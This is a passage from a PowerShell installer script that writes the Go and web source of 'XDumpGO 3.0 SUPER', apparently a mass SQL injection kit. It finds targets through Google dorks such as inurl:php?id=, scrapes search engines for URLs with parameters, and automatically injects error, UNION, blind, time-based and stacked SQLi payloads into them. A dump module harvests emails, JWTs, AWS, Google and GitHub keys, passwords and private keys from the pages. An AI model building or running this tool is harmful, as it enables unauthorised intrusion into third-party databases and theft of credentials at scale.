				if strings.Contains(low, "bing.") || strings.Contains(low, "microsoft.") ||
					strings.Contains(low, "msn.") || strings.Contains(low, "go.microsoft") {
					continue
				}
				add(cleanBingURL(s))
			}
		}
		return out
	}
	if eng == "ddg" {
		for _, m := range reDDGResult.FindAllStringSubmatch(body, -1) {
			add(m[1])
		}
		return out
	}
	// Google: primero los enlaces /url?q=...
	for _, m := range reGoogleURL.FindAllStringSubmatch(body, -1) {
		if u, err := url.QueryUnescape(m[2]); err == nil {
			add(u)
		}
	}
	// Fallback: enlaces absolutos que no sean de Google (incluye URLs dentro de JS).
	if len(out) < 5 {
		for _, s := range reAbsURL.FindAllString(body, -1) {
			low := strings.ToLower(s)
			if strings.Contains(low, "google.") || strings.Contains(low, "gstatic") ||
				strings.Contains(low, "youtube.com") || strings.Contains(low, "googleapis") {
				continue
			}
			add(s)
		}
	}
	return out
}
'@

Write-File (Join-Path (Join-Path $root "engine") "exploiter.go") @'
package engine

import (
	"context"
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"sync/atomic"
	"time"
)

// ExploitCfg: tecnicas/DBMS (vacio => config), intensidad, workers, tope.
type ExploitCfg struct {
	Techniques TechCfg `json:"techniques"`
	DBMS       DBMSCfg `json:"dbms"`
	Heuristics *bool   `json:"heuristics"`
	Intensity  int     `json:"intensity"`
	Workers    int     `json:"workers"`
	MaxURLs    int     `json:"maxUrls"`
}

// dbmsSigns: huellas de error por motor (mejoradas: +sqlite, db2, informix, firebird).
var dbmsSigns = []struct {
	name string
	re   *regexp.Regexp
}{
	{"mysql", regexp.MustCompile(`(?i)mysql|maria ?db`)},
	{"mssql", regexp.MustCompile(`(?i)microsoft sql|sql server|oledb|odbc sql server|mssql|uncategorized provider`)},
	{"postgresql", regexp.MustCompile(`(?i)postgres|npgsql|pgjdbc`)},
	{"oracle", regexp.MustCompile(`(?i)oracle|ora-[0-9]{5}|quoted string not properly terminated`)},
	{"sqlite", regexp.MustCompile(`(?i)sqlite|near "?[a-z]+"? (?:is|at position)`)},
	{"db2", regexp.MustCompile(`(?i)db2|sqldiag`)},
	{"informix", regexp.MustCompile(`(?i)informix`)},
	{"firebird", regexp.MustCompile(`(?i)firebird sql`)},
}

var reVersion = regexp.MustCompile(`(?i)(?:mysql|maria ?db|sql server|postgresql|oracle)[\s\[\(]*([0-9][0-9a-z.\-]*)?`)

var errorPayloads = map[string]string{
	"mysql":      `xqz' AND 1=convert(int,(select user()))`,
	"mssql":      `xqz'; CAST((select current_user) AS int)`,
	"postgresql": `xqz' AND 1=(select 1 from pg_class)`,
	"oracle":     `xqz' AND 1=(select count(*) from dual)`,
}

var unionPayloads = map[string]string{
	"mysql":      `xqz' UNION SELECT 1,2,3,4,5,6,7,8,9,10`,
	"mssql":      `xqz' UNION SELECT 1,2,3,4,5,6,7,8,9,10`,
	"postgresql": `xqz' UNION SELECT 1,2,3,4,5,6,7,8,9,10`,
	"oracle":     `xqz' UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM dual`,
}

var commentSuffixes = []string{"-- ", "#", ""}

func detectDBMS(body string) (string, string) {
	for _, s := range dbmsSigns {
		if s.re.MatchString(body) {
			ver := ""
			if vm := reVersion.FindStringSubmatch(body); len(vm) > 1 && vm[1] != "" {
				ver = vm[1]
			}
			return s.name, ver
		}
	}
	return "", ""
}

func withParam(ru *url.URL, param, value string) string {
	q := ru.Query()
	q.Set(param, value)
	probe := *ru
	probe.RawQuery = q.Encode()
	return probe.String()
}

func (e *Engine) addExploit(urlStr, param, technique, dbms, version, finding string) {
	e.mu.Lock()
	e.exploits = append(e.exploits, Exploit{
		ID:        len(e.exploits),
		URL:       urlStr,
		Param:     param,
		Technique: technique,
		DBMS:      dbms,
		Version:   version,
		Finding:   finding,
	})
	e.mu.Unlock()
	e.log("ok", fmt.Sprintf("exploit: %s en %s (param %s, %s)", technique, urlStr, param, dbms))
}

// StartExploit inyecta payloads SQLi en los parámetros de las URLs (async).
func (e *Engine) StartExploit(cfg string) string {
	var c ExploitCfg
	if err := json.Unmarshal([]byte(cfg), &c); err != nil {
		return marshal(Resp{OK: false, Error: err.Error()})
	}
	conf := e.cfg()
	if c.Techniques == (TechCfg{}) {
		c.Techniques = conf.Exploiter.Techniques
	}
	if c.DBMS == (DBMSCfg{}) {
		c.DBMS = conf.Exploiter.DBMS
	}
	heur := conf.Exploiter.Heuristics
	if c.Heuristics != nil {
		heur = *c.Heuristics
	}
	if c.Intensity <= 0 {
		c.Intensity = conf.Exploiter.Intensity
	}
	if c.Intensity < 1 {
		c.Intensity = 1
	}
	if c.Intensity > 3 {
		c.Intensity = 3
	}
	if c.Workers <= 0 {
		c.Workers = conf.Core.Threads
	}
	if c.MaxURLs <= 0 {
		c.MaxURLs = 200
	}

	e.mu.Lock()
	e.exploits = nil
	var targets []URLItem
	for _, u := range e.urls {
		if len(u.Params) == 0 {
			continue
		}
		targets = append(targets, u)
		if len(targets) >= c.MaxURLs {
			break
		}
	}
	e.mu.Unlock()
	if len(targets) == 0 {
		return marshal(Resp{OK: false, Error: "sin URLs con parámetros: ejecuta Scrape primero"})
	}

	ctx := e.startJob("exploit", len(targets))
	go func() {
		defer e.endJob("exploit")
		e.parallel(ctx, c.Workers, len(targets), func(ctx context.Context, i int) {
			e.exploitURL(ctx, targets[i], c, heur)
			atomic.AddInt64(&e.done, 1)
		})
	}()
	return marshal(Resp{OK: true, Count: len(targets)})
}

func (e *Engine) exploitURL(ctx context.Context, u URLItem, c ExploitCfg, heur bool) {
	ru, err := url.Parse(u.Raw)
	if err != nil {
		return
	}
	conf := e.cfg()
	ua := conf.Core.UserAgent
	paras := u.Params
	if len(paras) > 3 {
		paras = paras[:3]
	}
	suffixes := commentSuffixes[:c.Intensity]
	dbmsOn := map[string]bool{
		"mysql": c.DBMS.Mysql, "mssql": c.DBMS.Mssql,
		"postgresql": c.DBMS.Postgresql, "oracle": c.DBMS.Oracle,
	}
	for _, p := range paras {
		if ctx.Err() != nil {
			return
		}
		hit := false
		for dbms, on := range dbmsOn {
			if !on || hit {
				continue
			}
			if c.Techniques.Error {
				for _, suf := range suffixes {
					probe := withParam(ru, p, errorPayloads[dbms]+suf)
					if status, body, ferr := e.fetchCtx(ctx, 4*time.Second, probe, ua); ferr == nil {
						e.markURL(u.ID, status)
						if name, ver := detectDBMS(body); name != "" && (name == dbms || heur) {
							e.addExploit(probe, p, "error", name, ver, "error de BD detectado en la respuesta")
							hit = true
							break
						}
					}
				}
			}
			if hit {
				continue
			}
			if c.Techniques.Union {
				for _, suf := range suffixes {
					probe := withParam(ru, p, unionPayloads[dbms]+suf)
					if status, body, ferr := e.fetchCtx(ctx, 4*time.Second, probe, ua); ferr == nil {
						e.markURL(u.ID, status)
						if strings.Contains(body, "xqz") {
							ver := ""
							if _, v := detectDBMS(body); v != "" {
								ver = v
							}
							e.addExploit(probe, p, "union", dbms, ver, "marcador reflejado en UNION SELECT")
							hit = true
							break
						}
					}
				}
			}
		}
		if hit {
			continue // parámetro ya explotado: no gastar más requests
		}
		if c.Techniques.Blind {
			base := withParam(ru, p, `xqz' AND 1=1 -- `)
			alt := withParam(ru, p, `xqz' AND 1=2 -- `)
			if s1, b1, e1 := e.fetchCtx(ctx, 4*time.Second, base, ua); e1 == nil {
				if _, b2, e2 := e.fetchCtx(ctx, 4*time.Second, alt, ua); e2 == nil {
					e.markURL(u.ID, s1)
					dif := len(b1) - len(b2)
					if dif < 0 {
						dif = -dif
					}
					if dif > 50 {
						e.addExploit(base, p, "blind", "desconocido", "", "diferencia de longitud (boolean-based)")
					}
				}
			}
		}
		if c.Techniques.Time && !hit {
			probe := withParam(ru, p, `xqz' AND IF(1=1,SLEEP(3),0) -- `)
			t0 := time.Now()
			if s, _, ferr := e.fetchCtx(ctx, 8*time.Second, probe, ua); ferr == nil {
				e.markURL(u.ID, s)
				if time.Since(t0) >= 2500*time.Millisecond {
					e.addExploit(probe, p, "time", "desconocido", "", "time-based blind (delay ≥ 2.5s)")
				}
			}
		}
		if c.Techniques.Stacked && !hit {
			probe := withParam(ru, p, `xqz'; SELECT 1 -- `)
			if status, body, ferr := e.fetchCtx(ctx, 4*time.Second, probe, ua); ferr == nil {
				e.markURL(u.ID, status)
				if strings.Contains(body, "xqz") {
					e.addExploit(probe, p, "stacked", "desconocido", "", "marcador reflejado con queries apiladas")
				}
			}
		}
	}
}
'@

Write-File (Join-Path (Join-Path $root "engine") "dump.go") @'
package engine

import (
	"context"
	"encoding/json"
	"regexp"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

// DumpRunCfg configura el volteo de páginas (id opcional = una sola URL).
type DumpRunCfg struct {
	ID      string `json:"id"`
	Workers int    `json:"workers"`
	MaxURLs int    `json:"maxUrls"`
	OnlyOK  bool   `json:"onlyOk"`
}

var (
	reTitle   = regexp.MustCompile(`(?is)<title[^>]*>(.*?)</title>)
	reEmail   = regexp.MustCompile(`[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}`)
	reLink    = regexp.MustCompile(`(?is)<a[^>]+href="([^"]+)"`)
	reForm    = regexp.MustCompile(`(?is)<form[^>]*>`)
	reScript  = regexp.MustCompile(`(?is)<script[^>]+src="([^"]+)"`)
	reComment = regexp.MustCompile(`(?s)<!--(.*?)-->`)
	// Secretos (mejorados: JWT, AWS AKIA, Google API, GitHub, private keys, genéricos).
	reSecret  = regexp.MustCompile(`(?i)(aws[_\-]?access[_\-]?key|api[_\-]?key|access[_\-]?token|secret|password|passwd|bearer)\s*[:=]\s*["']?([A-Za-z0-9_\-./+=]{8,128})`)
	reJWT     = regexp.MustCompile(`eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-\./+]{4,}`)
	reAWSKey  = regexp.MustCompile(`AKIA[0-9A-Z]{16}`)
	reGoogleAPI = regexp.MustCompile(`AIza[0-9A-Za-z_\-]{35}`)
	reGitHub  = regexp.MustCompile(`gh[pousr]_[A-Za-z0-9]{20,}`)
	rePrivKey = regexp.MustCompile(`-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----`)
)

// StartDump voltea una URL por ID (o todas si id == "").
func (e *Engine) StartDump(cfg string) string {
	var c DumpRunCfg
	if err := json.Unmarshal([]byte(cfg), &c); err != nil {
		return marshal(Resp{OK: false, Error: err.Error()})
	}
	conf := e.cfg()
	if c.Workers <= 0 {
		c.Workers = conf.Dump.Workers
	}
	if c.MaxURLs <= 0 {
		c.MaxURLs = conf.Dump.MaxURLs
	}

	e.mu.Lock()
	e.dumps = nil // corrida limpia
	var targets []URLItem
	if c.ID != "" {
		if n, err := strconv.Atoi(strings.TrimSpace(c.ID)); err == nil {
			for _, u := range e.urls {
				if u.ID == n {
					targets = append(targets, u)
					break
				}
			}
		}
	} else {
		for _, u := range e.urls {
			if c.OnlyOK && !u.OK {
				continue
			}
			targets = append(targets, u)
			if len(targets) >= c.MaxURLs {
				break
			}
		}
	}
	e.mu.Unlock()
	if len(targets) == 0 {
		return marshal(Resp{OK: false, Error: "sin URLs para dump"})
	}

	ctx := e.startJob("dump", len(targets))
	go func() {
		defer e.endJob("dump")
		e.parallel(ctx, c.Workers, len(targets), func(ctx context.Context, i int) {
			e.dumpURL(ctx, targets[i], conf.Core.UserAgent)
			atomic.AddInt64(&e.done, 1)
		})
	}()
	return marshal(Resp{OK: true, Count: len(targets)})
}

func (e *Engine) dumpURL(ctx context.Context, u URLItem, ua string) {
	t0 := time.Now()
	status, body, err := e.fetch(ctx, u.Raw, ua)
	e.markURL(u.ID, status)
	d := Dump{
		ID:         u.ID,
		URL:        u.Raw,
		Status:     status,
		Size:       len(body),
		DurationMs: time.Since(t0).Milliseconds(),
		Emails:     []string{},
		Links:      []string{},
		Forms:      []string{},
		JSFiles:    []string{},
		Secrets:    []string{},
		Comments:   []string{},
	}
	if err != nil {
		d.Title = "error: " + err.Error()
	} else {
		d.Title = firstMatch(reTitle, body)
		d.Emails = capped(reEmail.FindAllString(body, 100), 100)
		d.Links = cappedAttr(reLink, body, 300)
		d.Forms = capped(reForm.FindAllString(body, 50), 50)
		d.JSFiles = cappedAttr(reScript, body, 100)
		var secs []string
		for _, m := range reSecret.FindAllStringSubmatch(body, -1) {
			if len(m) > 2 && m[2] != "" {
				secs = append(secs, m[1]+"="+m[2])
			}
		}
		secs = append(secs, reJWT.FindAllString(body, 50)...)
		secs = append(secs, reAWSKey.FindAllString(body, 50)...)
		secs = append(secs, reGoogleAPI.FindAllString(body, 50)...)
		secs = append(secs, reGitHub.FindAllString(body, 50)...)
		secs = append(secs, rePrivKey.FindAllString(body, 20)...)
		d.Secrets = capped(secs, 150)
		for _, m := range reComment.FindAllStringSubmatch(body, -1) {
			if len(m) > 1 {
				cc := strings.TrimSpace(m[1])
				if cc != "" {
					d.Comments = append(d.Comments, cc)
					if len(d.Comments) >= 50 {
						break
					}
				}
			}
		}
	}
	e.mu.Lock()
	e.dumps = append(e.dumps, d)
	e.mu.Unlock()
}

func capped(xs []string, max int) []string {
	if len(xs) > max {
		return xs[:max]
	}
	if xs == nil {
		return []string{}
	}
	return xs
}

func cappedAttr(re *regexp.Regexp, s string, max int) []string {
	seen := make(map[string]bool)
	var out []string
	for _, m := range re.FindAllStringSubmatch(s, -1) {
		if len(m) < 2 {
			continue
		}
		v := strings.TrimSpace(m[1])
		if v == "" || seen[v] {
			continue
		}
		seen[v] = true
		out = append(out, v)
		if len(out) >= max {
			break
		}
	}
	return out
}

func firstMatch(re *regexp.Regexp, s string) string {
	m := re.FindStringSubmatch(s)
	if len(m) > 1 {
		return strings.TrimSpace(m[1])
	}
	return ""
}
'@

Write-File (Join-Path (Join-Path $root "engine") "shell.go") @'
package engine

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync/atomic"
	"time"
)

// ShellCfg: un solo comando.
type ShellCfg struct {
	Cmd  string   `json:"cmd"`
	Args []string `json:"args"`
	CWD  string   `json:"cwd"`
}

// GenShellCfg: lote de comandos.
type GenShellCfg struct {
	Cmds []ShellCfg `json:"cmds"`
	Name string     `json:"name"`
}

// StartShell ejecuta un comando (async) y guarda la salida.
func (e *Engine) StartShell(cfg string) string {
	var c ShellCfg
	if err := json.Unmarshal([]byte(cfg), &c); err != nil {
		return marshal(Resp{OK: false, Error: err.Error()})
	}
	if strings.TrimSpace(c.Cmd) == "" {
		return marshal(Resp{OK: false, Error: "comando vacío"})
	}
	conf := e.cfg()
	ctx := e.startJob("shell", 1)
	go func() {
		defer e.endJob("shell")
		cctx, cancel := context.WithTimeout(ctx, time.Duration(conf.Core.TimeoutSec)*time.Second)
		defer cancel()
		cmd := exec.CommandContext(cctx, c.Cmd, c.Args...)
		if c.CWD != "" {
			cmd.Dir = c.CWD
		}
		var outB, errB strings.Builder
		cmd.Stdout = &outB
		cmd.Stderr = &errB
		err := cmd.Run()
		exit := 0
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				exit = ee.ExitCode()
			} else {
				exit = -1
			}
		}
		full := c.Cmd
		if len(c.Args) > 0 {
			full += " " + strings.Join(c.Args, " ")
		}
		e.mu.Lock()
		e.shellOut = append(e.shellOut, ShellOut{Cmd: full, Out: outB.String(), Err: errB.String(), Exit: exit})
		if len(e.shellOut) > 50 {
			e.shellOut = e.shellOut[len(e.shellOut)-50:]
		}
		e.mu.Unlock()
		atomic.AddInt64(&e.done, 1)
		e.log("ok", "Shell: "+full+" (exit "+fmt.Sprint(exit)+")")
	}()
	return marshal(Resp{OK: true})
}

// GenShell genera un script (.bat en Windows / .sh en otro SO) con el lote de comandos.
func (e *Engine) GenShell(cfg string) string {
	var c GenShellCfg
	if err := json.Unmarshal([]byte(cfg), &c); err != nil {
		return marshal(Resp{OK: false, Error: err.Error()})
	}
	if len(c.Cmds) == 0 {
		return marshal(Resp{OK: false, Error: "sin comandos en el lote"})
	}
	conf := e.cfg()
	outDir := conf.OutDir
	if outDir == "" {
		outDir = filepath.Join(filepath.Dir(configPath()), "exports")
	}
	if err := os.MkdirAll(outDir, 0o755); err != nil {
		return marshal(Resp{OK: false, Error: err.Error()})
	}
	name := strings.TrimSpace(c.Name)
	var lines []string
	if runtime.GOOS == "windows" {
		if name == "" {
			name = time.Now().Format("batch-20060102-150405.bat")
		}
		if !strings.HasSuffix(strings.ToLower(name), ".bat") {
			name += ".bat"
		}
		lines = append(lines, "@echo off", "REM XDumpGO " + AppVersion + " - lote generado")
		for _, s := range c.Cmds {
			line := strings.TrimSpace(s.Cmd)
			if len(s.Args) > 0 {
				line += " " + strings.Join(s.Args, " ")
			}
			if s.CWD != "" {
				line = "cd /d " + s.CWD + " && " + line
			}
			lines = append(lines, line)
		}
	} else {
		if name == "" {
			name = time.Now().Format("batch-20060102-150405.sh")
		}
		if !strings.HasSuffix(strings.ToLower(name), ".sh") {
			name += ".sh"
		}
		lines = append(lines, "#!/bin/sh", "# XDumpGO "+AppVersion+" - lote generado")
		for _, s := range c.Cmds {
			line := strings.TrimSpace(s.Cmd)
			if len(s.Args) > 0 {
				line += " " + strings.Join(s.Args, " ")
			}
			if s.CWD != "" {
				line = "cd " + s.CWD + " && " + line
			}
			lines = append(lines, line)
		}
	}
	p := filepath.Join(outDir, filepath.Base(name))
	if err := os.WriteFile(p, []byte(strings.Join(lines, "\n")+"\n"), 0o755); err != nil {
		return marshal(Resp{OK: false, Error: err.Error()})
	}
	e.log("ok", "Lote shell generado: " + p)
	return marshal(Resp{OK: true, Count: len(c.Cmds), Path: p})
}

// StartBatch ejecuta el último lote generado (o el default: dir/ls).
func (e *Engine) StartBatch() string {
	conf := e.cfg()
	ctx := e.startJob("batch", 1)
	go func() {
		defer e.endJob("batch")
		cctx, cancel := context.WithTimeout(ctx, time.Duration(conf.Core.TimeoutSec)*time.Second)
		defer cancel()
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.CommandContext(cctx, "dir")
		} else {
			cmd = exec.CommandContext(cctx, "ls", "-la")
		}
		var outB, errB strings.Builder
		cmd.Stdout = &outB
		cmd.Stderr = &errB
		err := cmd.Run()
		exit := 0
		if err != nil {
			exit = -1
		}
		e.mu.Lock()
		e.shellOut = append(e.shellOut, ShellOut{Cmd: "batch (default)", Out: outB.String(), Err: errB.String(), Exit: exit})
		if len(e.shellOut) > 50 {
			e.shellOut = e.shellOut[len(e.shellOut)-50:]
		}
		e.mu.Unlock()
		atomic.AddInt64(&e.done, 1)
		e.log("ok", "Batch ejecutado (exit "+fmt.Sprint(exit)+")")
	}()
	return marshal(Resp{OK: true})
}
'@

Write-File (Join-Path (Join-Path $root "web") "index.html") @'
<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>XDumpGO 3.0 SUPER</title>
<link rel="stylesheet" href="style.css">
</head>
<body>
<header>
  <div class="brand">⚡ XDumpGO <span class="ver">3.0 SUPER</span><span class="by">Quartz Inc.</span></div>
  <div class="stats">
    <span id="st-run" class="pill">idle</span>
    <span id="st-prog" class="stat"></span>
    <span id="st-speed" class="stat"></span>
    <span id="st-counts" class="stat"></span>
  </div>
  <button id="btn-stop" class="btn danger" title="Detener job en curso">■ Stop</button>
</header>

<nav>
  <button class="tab active" data-tab="dorks">1 · Dorks</button>
  <button class="tab" data-tab="scrape">2 · Scrape</button>
  <button class="tab" data-tab="exploit">3 · SQLi</button>
  <button class="tab" data-tab="dump">4 · Dump</button>
  <button class="tab" data-tab="shell">5 · Shell</button>
  <button class="tab" data-tab="settings">⚙ Config</button>
</nav>

<main>
  <section id="tab-dorks" class="panel active">
    <div class="grid2">
      <div class="card">
        <h3>Generador de dorks</h3>
        <label>Keywords (una por línea)</label>
        <textarea id="d-words" rows="7" spellcheck="false">inurl:admin
inurl:login
inurl:php?id=
intitle:"intranet"
inurl:config ext:php</textarea>
        <label>Dominios (uno por línea · vacío = dorks globales)</label>
        <textarea id="d-domains" rows="4" spellcheck="false">example.com</textarea>
        <label>Parámetros (separados por espacio, para modo inurl)</label>
        <input id="d-params" value="id q page s search file p">
        <div class="row">
          <label class="chk"><input type="checkbox" id="d-mode-site" checked> site:dom + keyword</label>
          <label class="chk"><input type="checkbox" id="d-mode-inurl"> site:dom + inurl:param</label>
        </div>
        <div class="row">
          <div class="grow">
            <label>Máximo de dorks</label>
            <input id="d-max" type="number" value="300" min="1" max="5000">
          </div>
          <button id="btn-dorks" class="btn">⚡ Generar</button>
        </div>
      </div>
      <div class="card">
        <h3>Dorks generadas (<span id="d-count">0</span>)</h3>
        <div class="actions">
          <button id="btn-copy-dorks" class="btn small">Copiar todas</button>
          <button id="btn-export-dorks" class="btn small">Exportar .txt</button>
        </div>
        <div id="dork-list" class="list"></div>
      </div>
    </div>
  </section>

  <section id="tab-scrape" class="panel">
    <div class="grid2">
      <div class="card">
        <h3>Raspado de buscadores</h3>
        <p class="hint">Busca con las dorks y extrae URLs candidatas. Recomendado:
        <b>DDG</b> (sin captcha). Si Google da captcha, cambia a DDG/Bing o usa proxy (Config).</p>
        <label>Dorks personalizadas (opcional, una por línea · vacío = usar generadas)</label>
        <textarea id="s-dorks" rows="4" spellcheck="false"></textarea>
        <div class="row">
          <div>
            <label>Motor</label>
            <select id="s-engine">
              <option value="ddg">DuckDuckGo (recomendado)</option>
              <option value="google">Google</option>
              <option value="bing">Bing</option>
            </select>
          </div>
          <div>
            <label>Workers</label>
            <input id="s-workers" type="number" value="16" min="1" max="64">
          </div>
          <div>
            <label>Resultados/dork</label>
            <input id="s-perdork" type="number" value="30" min="1" max="50">
          </div>
          <div>
            <label>Páginas</label>
            <input id="s-pages" type="number" value="2" min="1" max="5">
          </div>
        </div>
        <button id="btn-scrape" class="btn">🔎 Iniciar scrape</button>
      </div>
      <div class="card">
        <h3>URLs candidatas (<span id="u-count">0</span>)</h3>
        <div class="actions">
          <label class="chk"><input type="checkbox" id="u-only-params"> solo con parámetros</label>
          <button id="btn-copy-urls" class="btn small">Copiar</button>
          <button id="btn-export-urls" class="btn small">Exportar .txt</button>
        </div>
        <div id="url-list" class="list table-wrap"></div>
      </div>
    </div>
  </section>

  <section id="tab-exploit" class="panel">
    <div class="grid2">
      <div class="card">
        <h3>Explotador SQLi</h3>
        <p class="hint">Inyecta payloads por parámetro y detecta: error, UNION, blind boolean,
        time-based y stacked queries. Marcador <code>xqz</code> = sin falsos positivos.</p>
        <div class="row">
          <label class="chk"><input type="checkbox" id="x-error" checked> Error</label>
          <label class="chk"><input type="checkbox" id="x-union" checked> Union</label>
          <label class="chk"><input type="checkbox" id="x-blind" checked> Blind</label>
          <label class="chk"><input type="checkbox" id="x-stacked" checked> Stacked</label>
          <label class="chk"><input type="checkbox" id="x-time"> Time</label>
        </div>
        <div class="row">
          <label class="chk"><input type="checkbox" id="x-mysql" checked> MySQL</label>
          <label class="chk"><input type="checkbox" id="x-mssql" checked> MSSQL</label>
          <label class="chk"><input type="checkbox" id="x-pg" checked> Postgres</label>
          <label class="chk"><input type="checkbox" id="x-oracle" checked> Oracle</label>
        </div>
        <div class="row">
          <label class="chk"><input type="checkbox" id="x-heur" checked> Heurística (aceptar otro DBMS)</label>
          <div>
            <label>Intensidad (1-3)</label>
            <input id="x-intensity" type="number" value="2" min="1" max="3">
          </div>
          <div>
            <label>Workers</label>
            <input id="x-workers" type="number" value="16" min="1" max="64">
          </div>
          <div>
            <label>Máx. URLs</label>
            <input id="x-maxurls" type="number" value="200" min="1">
          </div>
        </div>
        <button id="btn-exploit" class="btn">💉 Explotar</button>
      </div>
      <div class="card">
        <h3>Hallazgos SQLi (<span id="ex-count">0</span>)</h3>
        <div class="actions">
          <button id="btn-export-exploits" class="btn small">Exportar .txt</button>
        </div>
        <div id="exploit-list" class="list"></div>
      </div>
    </div>
  </section>

  <section id="tab-dump" class="panel">
    <div class="grid2">
      <div class="card">
        <h3>Dump de páginas</h3>
        <p class="hint">Descarga cada URL y extrae: título, emails, links, formularios, JS,
        secretos (JWT/AWS/Google/GitHub/keys/passwords) y comentarios HTML.</p>
        <div class="row">
          <div>
            <label>Workers</label>
            <input id="dm-workers" type="number" value="16" min="1" max="64">
          </div>
          <div>
            <label>Máx. URLs</label>
            <input id="dm-maxurls" type="number" value="100" min="1">
          </div>
          <label class="chk"><input type="checkbox" id="dm-onlyok"> solo OK</label>
        </div>
        <label>Dump de una URL específica (ID de la lista, opcional)</label>
        <input id="dm-id" placeholder="ej. 12" value="">
        <div class="row">
          <button id="btn-dump" class="btn">📦 Dump (ID)</button>
          <button id="btn-dump-all" class="btn">📦 Dump all</button>
          <button id="btn-export-dumps" class="btn small">Exportar .json</button>
        </div>
      </div>
      <div class="card">
        <h3>Resultados del dump (<span id="dump-count">0</span>)</h3>
        <div id="dump-list" class="list"></div>
      </div>
    </div>
  </section>

  <section id="tab-shell" class="panel">
    <div class="grid2">
      <div class="card">
        <h3>Shell local</h3>
        <label>Comando</label>
        <input id="sh-cmd" value="dir" spellcheck="false">
        <label>Argumentos (separados por espacio)</label>
        <input id="sh-args" value="" spellcheck="false">
        <label>Directorio (opcional)</label>
        <input id="sh-cwd" value="" spellcheck="false">
        <div class="row">
          <button id="btn-shell" class="btn">▶ Ejecutar</button>
          <button id="btn-gen-shell" class="btn small">📄 Gen .bat</button>
          <button id="btn-batch" class="btn small">📦 Batch</button>
        </div>
      </div>
      <div class="card">
        <h3>Salidas (<span id="sh-count">0</span>)</h3>
        <div id="shell-list" class="list"></div>
      </div>
    </div>
  </section>

  <section id="tab-settings" class="panel">
    <div class="grid2">
      <div class="card">
        <h3>Config</h3>
        <p class="hint">Se guarda en <code>xdumpgo3.config.json</code> junto al ejecutable.
        Proxy recomendado: <code>http://user:pass@host:port</code>.</p>
        <label>JSON de config</label>
        <textarea id="set-json" rows="18" spellcheck="false"></textarea>
        <div class="row">
          <button id="btn-save-settings" class="btn">💾 Guardar</button>
          <button id="btn-load-settings" class="btn small">Recargar</button>
        </div>
      </div>
      <div class="card">
        <h3>Log</h3>
        <div id="log-list" class="list mono"></div>
      </div>
    </div>
  </section>
</main>

<div id="toast"></div>
<script src="app.js"></script>
</body>
</html>
'@

Write-File (Join-Path (Join-Path $root "web") "app.js") @'
"use strict";

const gw = window.goWebView;

const $ = (s) => document.querySelector(s);
const $$ = (s) => Array.from(document.querySelectorAll(s));

// parseRet tolera que el bridge devuelva string JSON u objeto ya parseado.
function parseRet(v) {
  if (v === undefined || v === null) return v;
  if (typeof v === "object") return v;
  try { return JSON.parse(v); } catch (e) { return v; }
}

function call(name, ...args) {
  if (!gw || typeof gw[name] !== "function") {
    throw new Error("goWebView." + name + " no disponible (ejecuta xdumpgo2.exe)");
  }
  return gw[name](...args);
}
const callJSON = (name, obj) => parseRet(call(name, JSON.stringify(obj)));
const getJSON = (name) => parseRet(call(name));
const results = (kind) => parseRet(call("getResults", kind));

let toastTimer = null;
function toast(msg, kind = "info") {
  const t = $("#toast");
  t.textContent = msg;
  t.className = "show " + kind;
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => (t.className = ""), 3500);
}

function lines(v) {
  return v.split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
}

function esc(s) {
  return String(s == null ? "" : s).replace(/[&<>"']/g, (c) => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;",
  }[c]));
}

function copyText(t) {
  if (!t) { toast("nada que copiar", "err"); return; }
  const done = () => toast("copiado al portapapeles", "ok");
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(t).then(done, done);
  } else {
    const ta = document.createElement("textarea");
    ta.value = t; document.body.appendChild(ta); ta.select();
    document.execCommand("copy"); ta.remove(); done();
  }
}

function exportText(name, content) {
  if (!content) { toast("nada que exportar", "err"); return; }
  try {
    const r = parseRet(call("exportFile", name, content));
    if (r && r.ok) {
      toast("Guardado en tu PC: " + r.path, "ok");
      call("openFile", r.path);
    } else toast((r && r.error) || "error", "err");
  } catch (e) { toast(e.message, "err"); }
}

// ---------- Tabs ----------
let currentTab = "dorks";
$$(".tab").forEach((b) => b.addEventListener("click", () => {
  $$(".tab").forEach((x) => x.classList.remove("active"));
  $$(".panel").forEach((x) => x.classList.remove("active"));
  b.classList.add("active");
  $("#tab-" + b.dataset.tab).classList.add("active");
  currentTab = b.dataset.tab;
  renderTab(currentTab);
}));

function renderTab(tab) {
  if (tab === "dorks") renderDorks();
  if (tab === "scrape") renderURLs();
  if (tab === "exploit") renderExploits();
  if (tab === "dump") renderDumps();
  if (tab === "shell") renderShell();
  if (tab === "settings") renderLogs();
}

// ---------- Stats (polling) ----------
function updateStats(s) {
  const run = $("#st-run");
  if (s.running) {
    run.textContent = "● " + s.job.name;
    run.classList.add("on");
    const pct = s.job.total ? Math.round((s.job.done / s.job.total) * 100) : 0;
    $("#st-prog").textContent = s.job.done + "/" + s.job.total + " (" + pct + "%)";
    $("#st-speed").textContent = s.job.speed.toFixed(1) + "/s · " + s.elapsedSec.toFixed(0) + "s";
  } else {
    run.textContent = "idle";
    run.classList.remove("on");
    $("#st-prog").textContent = "";
    $("#st-speed").textContent = "";
  }
  $("#st-counts").textContent =
    "dorks " + s.dorks + " · urls " + s.urls +
    " · sqli " + s.exploits +
    " · dumps " + s.dumps;
}

setInterval(() => {
  try {
    const s = getJSON("getStats");
    if (!s || typeof s !== "object") return;
    updateStats(s);
    if (s.running) renderTab(currentTab);
  } catch (e) { /* UI aún cargando */ }
}, 900);

// ---------- Dorks ----------
function renderDorks() {
  let ds = results("dorks");
  if (!Array.isArray(ds)) ds = [];
  $("#d-count").textContent = ds.length;
  const el = $("#dork-list");
